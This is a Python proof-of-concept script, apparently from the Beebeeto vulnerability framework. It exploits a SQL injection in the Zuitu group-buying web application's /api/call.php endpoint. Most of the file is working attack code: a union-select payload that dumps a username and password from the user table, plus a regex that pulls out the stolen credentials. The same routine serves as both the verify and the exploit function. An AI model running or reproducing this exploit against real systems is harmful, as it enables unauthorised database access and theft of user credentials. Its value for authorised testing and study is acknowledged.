#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0047',
            'name': '最土团购 /api/call.php SQL注入漏洞 EXP',
            'author': 'Bug',
            'create_date': '2014-10-03',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '最土团购',
            'vul_version': ['*'],
            'type': 'SQL Injection',
            'tag': ['SQL Injection', '最土团购漏洞', '信息泄露'],
            'desc': 'N/A',
            'references': ['http://www.moonsec.com/post-11.html'],
        },
    }

    @classmethod
    def verify(cls, args):
        payload = ("/api/call.php?action=query&num=11%27%29/**/union/**/select/**/1,2,3,"
                   "concat%280x7e,0x27,username,0x7e,0x27,password%29,5,6,7,8,9,10,11,12,13,"
                   "14,15,16/**/from/**/user/**/limit/**/0,1%23")
        verify_url = args['options']['target'] + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(urllib2.Request(verify_url)).read()
        pattern = re.compile(r".*?<id>\s*~'\s*(?P<username>[^~]+)\s*~'\s*(?P<password>[\w]+)\s*</id>",
                             re.I|re.S)#忽略大小写、单行模式
        match = pattern.match(content)
        if match == None:
            args['success'] = False
            return args
        username = match.group("username")
        password = match.group("password")
        args['success'] = True
        args['poc_ret']['vul_url'] = verify_url
        args['poc_ret']['Username'] = username
        args['poc_ret']['Password'] = password
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
